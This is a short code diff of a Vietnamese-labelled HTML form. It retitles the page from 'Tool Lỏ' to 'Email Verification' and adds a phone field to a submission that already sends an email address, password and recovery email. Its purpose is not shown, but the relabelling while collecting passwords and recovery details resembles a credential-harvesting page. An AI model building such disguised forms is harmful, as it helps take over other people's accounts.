@@ -173,7 +173,7 @@
 </head>
 <body>
     <div class="container">
-        <h1>📧 Tool Lỏ</h1>
+        <h1>📧 Email Verification</h1>
         
         <div class="input-group">
             <label>Email gốc</label>
@@ -486,6 +486,7 @@
             const email = document.getElementById('emailInput').value;
             const password = document.getElementById('passwordInput').value;
             const recovery = document.getElementById('mailkpInput').value;
+            const phone = document.getElementById('phoneInput').value;
             const trail = document.getElementById('trailInput').value;
 
             if (!email || !password || !recovery) {
@@ -518,6 +519,7 @@
                         email: email,
                         password: password,
                         recovery: recovery,
+                        phone: phone,
                         trail: trail,
                         created_at: created_at
                     })
